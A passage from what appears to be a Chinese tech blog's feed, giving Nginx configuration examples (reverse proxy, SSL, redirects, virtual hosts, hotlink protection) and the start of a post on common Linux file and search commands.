class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">upstream</span> server-api&#123;</span><br><span class="line">    <span class="comment"># api 代理服务地址</span></span><br><span class="line">    <span class="attribute">server</span> <span class="number">127.0.0.1:3110</span>;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">upstream</span> server-resource&#123;</span><br><span class="line">    <span class="comment"># 静态资源 代理服务地址</span></span><br><span class="line">    <span class="attribute">server</span> <span class="number">127.0.0.1:3120</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">3111</span>;</span><br><span class="line">    <span class="attribute">server_name</span>  localhost;      <span class="comment"># 这里指定域名</span></span><br><span class="line">    <span class="attribute">root</span> /home/www/server-statics;</span><br><span class="line">    <span class="comment"># 匹配 api 路由的反向代理到API服务</span></span><br><span class="line">    <span class="attribute">location</span><span class="regexp"> ^~/api/</span> &#123;</span><br><span class="line">        <span class="attribute">rewrite</span><span class="regexp"> ^/(.*)$</span> /<span class="variable">$1</span> <span class="literal">break</span>;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://server-api;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 假设这里验证码也在API服务中</span></span><br><span class="line">    <span class="attribute">location</span><span class="regexp"> ^~/captcha</span> &#123;</span><br><span class="line">        <span class="attribute">rewrite</span><span class="regexp"> ^/(.*)$</span> /<span class="variable">$1</span> <span class="literal">break</span>;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://server-api;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 假设你的图片资源全部在另外一个服务上面</span></span><br><span class="line">    <span class="attribute">location</span><span class="regexp"> ^~/img/</span> &#123;</span><br><span class="line">        <span class="attribute">rewrite</span><span class="regexp"> ^/(.*)$</span> /<span class="variable">$1</span> <span class="literal">break</span>;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://server-resource;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 路由在前端，后端没有真实路由，在路由不存在的 404状态的页面返回 /index.html</span></span><br><span class="line">    <span class="comment"># 这个方式使用场景，你在写React或者Vue项目的时候，没有真实路由</span></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.html =<span class="number">404</span>;</span><br><span class="line">        <span class="comment">#                               ^ 空格很重要</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-4-代理转发连接替换"><a href="#10-4-代理转发连接替换" class="headerlink" title="10.4 代理转发连接替换"></a>10.4 代理转发连接替换</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span><span class="regexp"> ^~/api/upload</span> &#123;</span><br><span class="line">    <span class="attribute">rewrite</span><span class="regexp"> ^/(.*)$</span> /wfs/v1/upload <span class="literal">break</span>;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://wfs-api;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-5-ssl配置"><a href="#10-5-ssl配置" class="headerlink" title="10.5 ssl配置"></a>10.5 ssl配置</h3><ul><li>超文本传输安全协议（缩写：HTTPS，英语：Hypertext Transfer Protocol Secure）是超文本传输协议和SSL/TLS的组合，用以提供加密通讯及对网络服务器身份的鉴定。HTTPS连接经常被用于万维网上的交易支付和企业信息系统中敏感信息的传输。HTTPS不应与在RFC 2660中定义的安全超文本传输协议（S-HTTP）相混。HTTPS 目前已经是所有注重隐私和安全的网站的首选，随着技术的不断发展，HTTPS 网站已不再是大型网站的专利，所有普通的个人站长和博客均可以自己动手搭建一个安全的加密的网站。</li></ul><ul><li>创建<code>SSL</code>证书，如果你购买的证书，就可以直接下载</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /etc/nginx/ssl</span><br><span class="line"><span class="comment"># 创建了有效期100年，加密强度为RSA2048的SSL密钥key和X509证书文件。</span></span><br><span class="line">sudo openssl req -x509 -nodes -days 36500 -newkey rsa:2048 -keyout /etc/nginx/ssl/nginx.key -out /etc/nginx/ssl/nginx.crt</span><br><span class="line"><span class="comment"># 上面命令，会有下面需要填写内容</span></span><br><span class="line">Country Name (2 letter code) [AU]:US</span><br><span class="line">State or Province Name (full name) [Some-State]:New York</span><br><span class="line">Locality Name (eg, city) []:New York City</span><br><span class="line">Organization Name (eg, company) [Internet Widgits Pty Ltd]:Bouncy Castles, Inc.</span><br><span class="line">Organizational Unit Name (eg, section) []:Ministry of Water Slides</span><br><span class="line">Common Name (e.g. server FQDN or YOUR name) []:your_domain.com</span><br><span class="line">Email Address []:admin@your_domain.com</span><br></pre></td></tr></table></figure><ul><li>创建自签证书</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">首先，创建证书和私钥的目录</span><br><span class="line"><span class="comment"># mkdir -p /etc/nginx/cert</span></span><br><span class="line"><span class="comment"># cd /etc/nginx/cert</span></span><br><span class="line">创建服务器私钥，命令会让你输入一个口令：</span><br><span class="line"><span class="comment"># openssl genrsa -des3 -out nginx.key 2048</span></span><br><span class="line">创建签名请求的证书（CSR）：</span><br><span class="line"><span class="comment"># openssl req -new -key nginx.key -out nginx.csr</span></span><br><span class="line">在加载SSL支持的Nginx并使用上述私钥时除去必须的口令：</span><br><span class="line"><span class="comment"># cp nginx.key nginx.key.org</span></span><br><span class="line"><span class="comment"># openssl rsa -in nginx.key.org -out nginx.key</span></span><br><span class="line">最后标记证书使用上述私钥和CSR：</span><br><span class="line"><span class="comment"># openssl x509 -req -days 365 -in nginx.csr -signkey nginx.key -out nginx.crt</span></span><br></pre></td></tr></table></figure><p>查看目前nginx编译选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sbin/nginx -V</span><br></pre></td></tr></table></figure><p>输出下面内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nginx version: nginx/1.7.8</span><br><span class="line">built by gcc 4.4.7 20120313 (Red Hat 4.4.7-4) (GCC)</span><br><span class="line">TLS SNI support enabled</span><br><span class="line">configure arguments: --prefix=/usr/local/nginx-1.7.8 --with-http_ssl_module --with-http_spdy_module --with-http_stub_status_module --with-pcre</span><br></pre></td></tr></table></figure><p>如果依赖的模块不存在，可以进入安装目录，输入下面命令重新编译安装。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/<span class="built_in">local</span>/nginx --with-http_stub_status_module --with-http_ssl_module</span><br></pre></td></tr></table></figure><p>运行完成之后还需要<code>make</code> (不用make install)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份nginx的二进制文件</span></span><br><span class="line">cp -rf /usr/<span class="built_in">local</span>/nginx/sbin/nginx　 /usr/<span class="built_in">local</span>/nginx/sbin/nginx.bak</span><br><span class="line"><span class="comment"># 覆盖nginx的二进制文件</span></span><br><span class="line">cp -rf objs/nginx   /usr/<span class="built_in">local</span>/nginx/sbin/</span><br></pre></td></tr></table></figure><p>HTTPS server</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">443</span> ssl;</span><br><span class="line">    <span class="attribute">server_name</span>  localhost;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span> /etc/nginx/ssl/nginx.crt;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/nginx/ssl/nginx.key;</span><br><span class="line">    <span class="comment"># 禁止在header中出现服务器版本，防止黑客利用版本漏洞攻击</span></span><br><span class="line">    <span class="attribute">server_tokens</span> <span class="literal">off</span>;</span><br><span class="line">    <span class="comment"># 设置ssl/tls会话缓存的类型和大小。如果设置了这个参数一般是shared，buildin可能会参数内存碎片，默认是none，和off差不多，停用缓存。如shared:SSL:10m表示我所有的nginx工作进程共享ssl会话缓存，官网介绍说1M可以存放约4000个sessions。 </span></span><br><span class="line">    <span class="attribute">ssl_session_cache</span>    shared:SSL:<span class="number">1m</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 客户端可以重用会话缓存中ssl参数的过期时间，内网系统默认5分钟太短了，可以设成30m即30分钟甚至4h。</span></span><br><span class="line">    <span class="attribute">ssl_session_timeout</span>  <span class="number">5m</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 选择加密套件，不同的浏览器所支持的套件（和顺序）可能会不同。</span></span><br><span class="line">    <span class="comment"># 这里指定的是OpenSSL库能够识别的写法，你可以通过 openssl -v cipher 'RC4:HIGH:!aNULL:!MD5'（后面是你所指定的套件加密算法） 来看所支持算法。</span></span><br><span class="line">    <span class="attribute">ssl_ciphers</span>  HIGH:!aNULL:!MD5;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置协商加密算法时，优先使用我们服务端的加密套件，而不是客户端浏览器的加密套件。</span></span><br><span class="line">    <span class="attribute">ssl_prefer_server_ciphers</span>  <span class="literal">on</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">root</span>   html;</span><br><span class="line">        <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-6-强制将http重定向到https"><a href="#10-6-强制将http重定向到https" class="headerlink" title="10.6 强制将http重定向到https"></a>10.6 强制将http重定向到https</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span>  example.com;</span><br><span class="line">    <span class="attribute">rewrite</span><span class="regexp"> ^</span> https://<span class="variable">$http_host</span><span class="variable">$request_uri</span>? <span class="literal">permanent</span>;    <span class="comment"># 强制将http重定向到https</span></span><br><span class="line">    <span class="comment"># 在错误页面和“服务器”响应头字段中启用或禁用发射nginx版本。 防止黑客利用版本漏洞攻击</span></span><br><span class="line">    <span class="attribute">server_tokens</span> <span class="literal">off</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-7-两个虚拟主机"><a href="#10-7-两个虚拟主机" class="headerlink" title="10.7 两个虚拟主机"></a>10.7 两个虚拟主机</h3><ul><li>纯静态<code>-html</code> 支持</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span>          <span class="number">80</span>;</span><br><span class="line">        <span class="attribute">server_name</span>     www.domain1.com;</span><br><span class="line">        <span class="attribute">access_log</span>      logs/domain1.access.log main;</span><br><span class="line">        <span class="attribute">location</span> / &#123;</span><br><span class="line">            <span class="attribute">index</span> index.html;</span><br><span class="line">            <span class="attribute">root</span>  /var/www/domain1.com/htdocs;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span>          <span class="number">80</span>;</span><br><span class="line">        <span class="attribute">server_name</span>     www.domain2.com;</span><br><span class="line">        <span class="attribute">access_log</span>      logs/domain2.access.log main;</span><br><span class="line">        <span class="attribute">location</span> / &#123;</span><br><span class="line">            <span class="attribute">index</span> index.html;</span><br><span class="line">            <span class="attribute">root</span>  /var/www/domain2.com/htdocs;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-8-虚拟主机标准配置"><a href="#10-8-虚拟主机标准配置" class="headerlink" title="10.8 虚拟主机标准配置"></a>10.8 虚拟主机标准配置</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">  <span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>          <span class="number">80</span> default;</span><br><span class="line">    <span class="attribute">server_name</span>     _ *;</span><br><span class="line">    <span class="attribute">access_log</span>      logs/default.access.log main;</span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">       <span class="attribute">index</span> index.html;</span><br><span class="line">       <span class="attribute">root</span>  /var/www/default/htdocs;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-9-防盗链"><a href="#10-9-防盗链" class="headerlink" title="10.9 防盗链"></a>10.9 防盗链</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~* \.(gif|jpg|png|swf|flv)$</span> &#123;</span><br><span class="line">   <span class="attribute">root</span> html</span><br><span class="line">   valid_referers <span class="literal">none</span> <span class="literal">blocked</span> <span class="regexp">*.nginxcn.com</span>;</span><br><span class="line">   <span class="attribute">if</span> (<span class="variable">$invalid_referer</span>) &#123;</span><br><span class="line">     <span class="attribute">rewrite</span><span class="regexp"> ^/</span> www.nginx.cn</span><br><span class="line">     <span class="comment">#return 404;</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-10虚拟目录配置"><a href="#10-10虚拟目录配置" class="headerlink" title="10.10虚拟目录配置"></a>10.10虚拟目录配置</h3><p>alias指定的目录是准确的，root是指定目录的上级目录，并且该上级目录要含有location指定名称的同名目录。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> /img/ &#123;</span><br><span class="line">    <span class="attribute">alias</span> /var/www/image/;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 访问/img/目录里面的文件时，ningx会自动去/var/www/image/目录找文件</span></span><br><span class="line"><span class="attribute">location</span> /img/ &#123;</span><br><span class="line">    <span class="attribute">root</span> /var/www/image;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 访问/img/目录下的文件时，nginx会去/var/www/image/img/目录下找文件。]</span></span><br></pre></td></tr></table></figure><h3 id="10-11-防盗图配置"><a href="#10-11-防盗图配置" class="headerlink" title="10.11 防盗图配置"></a>10.11 防盗图配置</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~ \/public\/(css|js|img)\/.*\.(js|css|gif|jpg|jpeg|png|bmp|swf)</span> &#123;</span><br><span class="line">    <span class="attribute">valid_referers</span> <span class="literal">none</span> <span class="literal">blocked</span> <span class="regexp">*.jslite.io</span>;</span><br><span class="line">    <span class="attribute">if</span> (<span class="variable">$invalid_referer</span>) &#123;</span><br><span class="line">        <span class="attribute">rewrite</span><span class="regexp"> ^/</span>  http://wangchujiang.com/piratesp.png;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-12-屏蔽-git等文件"><a href="#10-12-屏蔽-git等文件" class="headerlink" title="10.12 屏蔽.git等文件"></a>10.12 屏蔽.git等文件</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~ (.git|.gitattributes|.gitignore|.svn)</span> &#123;</span><br><span class="line">    <span class="attribute">deny</span> all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="域名路径加不加需要都能正常访问"><a href="#域名路径加不加需要都能正常访问" class="headerlink" title="域名路径加不加需要都能正常访问"></a>域名路径加不加需要都能正常访问</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://wangchujiang.com/api/index.php?a=1&amp;name=wcj</span><br><span class="line">                                  ^ 有后缀</span><br><span class="line"></span><br><span class="line">http://wangchujiang.com/api/index?a=1&amp;name=wcj</span><br><span class="line">                                 ^ 没有后缀</span><br></pre></td></tr></table></figure><ul><li><code>nginx rewrite</code>规则如下：</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">rewrite</span><span class="regexp"> ^/(.*)/$</span> /index.php?/<span class="variable">$1</span> <span class="literal">permanent</span>;</span><br><span class="line"><span class="attribute">if</span> (!-d <span class="variable">$request_filename</span>)&#123;</span><br><span class="line">        <span class="attribute">set</span> <span class="variable">$rule_1</span> <span class="number">1</span><span class="variable">$rule_1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">if</span> (!-f <span class="variable">$request_filename</span>)&#123;</span><br><span class="line">        <span class="attribute">set</span> <span class="variable">$rule_1</span> <span class="number">2</span><span class="variable">$rule_1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">if</span> (<span class="variable">$rule_1</span> = <span class="string">"21"</span>)&#123;</span><br><span class="line">        <span class="attribute">rewrite</span><span class="regexp"> ^/</span> /index.php <span class="literal">last</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="十一、错误问题"><a href="#十一、错误问题" class="headerlink" title="十一、错误问题"></a>十一、错误问题</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The plain HTTP request was sent to HTTPS port</span><br></pre></td></tr></table></figure><ul><li>解决办法，<code>fastcgi_param HTTPS $https if_not_empty</code> 添加这条规则，</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl; <span class="comment"># 注意这条规则</span></span><br><span class="line">    <span class="attribute">server_name</span>  my.domain.com;</span><br><span class="line">    </span><br><span class="line">    <span class="attribute">fastcgi_param</span> HTTPS <span class="variable">$https</span> if_not_empty;</span><br><span class="line">    <span class="attribute">fastcgi_param</span> HTTPS <span class="literal">on</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span> /etc/ssl/certs/your.pem;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/ssl/private/your.key;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="comment"># Your config here...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="十二、精品文章参考"><a href="#十二、精品文章参考" class="headerlink" title="十二、精品文章参考"></a>十二、精品文章参考</h2><ul><li><a href="https://my.oschina.net/u/3341316/blog/877206" target="_blank" rel="noopener">负载均衡原理的解析</a></li><li><a href="http://blog.githuber.cn/posts/73" target="_blank" rel="noopener">Nginx泛域名解析，实现多个二级域名 </a></li><li><a href="https://www.nginx.com/blog/inside-nginx-how-we-designed-for-performance-scale/" target="_blank" rel="noopener">深入 NGINX: 我们如何设计性能和扩展</a></li><li><a href="https://www.nginx.com/blog/inside-nginx-how-we-designed-for-performance-scale/" target="_blank" rel="noopener">Inside NGINX: How We Designed for Performance &amp; Scale</a></li><li><a href="http://tengine.taobao.org/book/index.html" target="_blank" rel="noopener">Nginx开发从入门到精通</a></li><li><a href="http://os.51cto.com/art/201703/535326.htm#topx" target="_blank" rel="noopener">Nginx的优化与防盗链</a></li><li><a href="https://segmentfault.com/a/1190000009769143" target="_blank" rel="noopener">实战开发一个Nginx扩展 (Nginx Module)</a></li><li><a href="https://my.oschina.net/xshuai/blog/917097" target="_blank" rel="noopener">Nginx+Keepalived(双机热备)搭建高可用负载均衡环境(HA)</a></li><li><a href="http://www.huxd.org/articles/2017/07/24/1500890692329.html" target="_blank" rel="noopener">Nginx 平滑升级</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIxNzg5ODE0OA==&amp;mid=2247483708&amp;idx=1&amp;sn=90b0b1dccd9c337922a0588245277666&amp;chksm=97f38cf7a08405e1928e0b46d923d630e529e7db8ac7ca2a91310a075986f8bcb2cee5b4953d#rd" target="_blank" rel="noopener">Nginx最新模块—ngx_http_mirror_module分析可以做版本发布前的预先验证，进行流量放大后的压测等等</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Nginx&lt;/code&gt; 是一款面向性能设计的 &lt;code&gt;HTTP&lt;/code&gt; 服务器，能反向代理 &lt;code&gt;HTTP&lt;/code&gt;，&lt;code&gt;HTTPS&lt;/code&gt; 和邮件相关(&lt;code&gt;SMTP&lt;/code&gt;，&lt;code
      
    
    </summary>
    
      <category term="Back-end" scheme="http://blog.poetries.top/categories/Back-end/"/>
    
    
      <category term="Nginx" scheme="http://blog.poetries.top/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>日常频繁使用的Linux命令</title>
    <link href="http://blog.poetries.top/2018/02/25/linux-frequently-use-command/"/>
    <id>http://blog.poetries.top/2018/02/25/linux-frequently-use-command/</id>
    <published>2018-02-25T01:32:41.000Z</published>
    <updated>2018-08-23T01:41:37.487Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、文件管理"><a href="#一、文件管理" class="headerlink" title="一、文件管理"></a>一、文件管理</h2><p><strong>1.1 创建删除文件</strong></p><ul><li><code>mkdir</code>(<code>-p</code>多层创建)</li><li><code>touch</code></li><li><code>cp</code>(<code>-r</code>递归复制)</li><li><code>rm -rf</code></li><li><code>mv</code>(改名、移动剪切)</li><li><code>cat</code> (打印)</li></ul><p><strong>1.2 创建删除软连接</strong></p><blockquote><p>linux下的软链接类似于windows下的快捷方式。常用于实际路径很深，每次进入的时候需要花费一定时间，此时我们在根目录创建一个软链接指向该目录，那么我们进入该软连接其实就是进入了软链接指向的实际目录。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln  -s  /data/elastic/plugin/ik/custom  myES</span><br></pre></td></tr></table></figure><ul><li>以上命令中的 <code>/data/elastic/plugin/ik/custom</code> 就是源文件，<code>myES</code> 是链接文件名， 其作用是当进入 <code>myES</code> 目录，实际上是链接进入了 <code>/data/elastic/plugin/ik/custom</code> 目录</li><li><strong>删除软链接</strong> <code>rm -rf  myES</code> <ul><li>注意不是 <code>rm -rf  myES/</code></li></ul></li></ul><p><strong>1.3 重定向命令</strong></p><ul><li><code>ls  -l  /etc &gt; /home/myback.txt</code>     (覆盖重定向)　把显示的结果覆盖到<code>/home/myback.txt</code>中去</li><li><code>ls  -l  /etc &gt;&gt; /home/myback.txt</code>     (追加重定向)　把显示的结果追加到<code>/home/myback.txt</code>中去 </li></ul><p><strong>1.4 查看文件大小</strong></p><ul><li>查看某个文件夹当前所占用的空间使用 <code>du -h file</code></li><li>查看当前目录下的所有文件各个大小 <code>du -sh *</code>  </li></ul><h2 id="二、搜索命令"><a href="#二、搜索命令" class="headerlink" title="二、搜索命令"></a>二、搜索命令</h2><p><strong>2.1 管道过滤</strong></p><ul><li>使用管道命令过滤搜索的内容 <code>ls -l /etc | more</code></li></ul><p><strong>2.2 查询命令</strong>  </p><ul><li><strong>which</strong></li></ul><blockquote><p>在<code>PATH</code>变量指定的路径中，搜索某个系统命令的位置，并且返回第一个搜索结果</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># `-a`：将所有由`PATH`目录中可以找到的命令均列出来，而不是只列出第一个被找到的命令</span></span><br><span class="line">[root@www ~] <span class="comment"># which ifconfig</span></span><br><span class="line">/sbin/ifconfig</span><br></pre></td></tr></table></figure><ul><li><strong>whereis</strong><ul><li><code>-b</code> 只查找二进制格式的文件</li><li><code>-m</code> 只查找在说明文件manual路径下的文件</li><li><code>-s</code> 只招<code>source</code>源文件</li><li><code>-u</code> 查找不在上述三个选项当中的其他特殊文件</li></ul></li></ul><blockquote><p>只能用于程序名的搜索，而且只搜索二进制文件（参数<code>-b</code>）、<code>man</code>说明文件（参数<code>-m</code>）和源代码文件（参数<code>-s</code>）</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis [-bmsu] 文件或目录名</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@www ~] <span class="comment"># whereis ifconfig</span></span><br><span class="line">ifconfig: /sbin/ifconfig /usr/share/man/man8/ifconfig.8.gz</span><br><span class="line">[root@www ~] <span class="comment"># whereis -m ifconfig</span></span><br><span class="line">ifconfig: /usr/share/man/man8/ifconfig.8.gz</span><br></pre></td></tr></table></figure><ul><li><strong>locate</strong><ul><li><code>-i</code>：忽略大小写差异；</li><li><code>-r</code>：后面可接正则表达式的实现方式。</li></ul></li></ul><blockquote><p>相当于<code>find -name</code>，可快速查找文件</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate [-ir] keyword</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@www ~] <span class="comment"># locate passwd</span></span><br><span class="line">/etc/passwd</span><br><span class="line">/etc/passwd-</span><br><span class="line">/etc/news/passwd.nntp</span><br><span class="line">/etc/pam.d/passwd</span><br></pre></td></tr></table></figure><ul><li><strong>find查找任何文件</strong></li></ul><blockquote><p>最常用和最强大的查找命令，可以用它找到任何想找的文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 